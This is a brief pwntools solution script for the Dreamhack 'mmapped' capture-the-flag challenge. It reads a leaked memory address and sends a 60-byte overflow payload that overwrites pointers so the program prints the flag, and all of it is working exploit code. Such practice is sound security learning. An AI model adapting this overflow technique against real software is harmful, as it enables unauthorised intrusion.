from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/mmapped/chall')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:23358'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

p.recvuntil(b"): ")
mmapped = p.recvline().strip()
mmapped = int(mmapped, 16)

print(f"I correctly got {mmapped}!")

#we can only write 60 bytes in buf
buf = ( b"A"*40 +
        p64(mmapped) + #we can leave the address as it is
        p64(mmapped) + #make v6 point to real flag
        p32(0x0) #this is v7; remaining 4 bytes send 0
      )

p.recvuntil(b"input: ")
p.send(buf)

p.interactive()
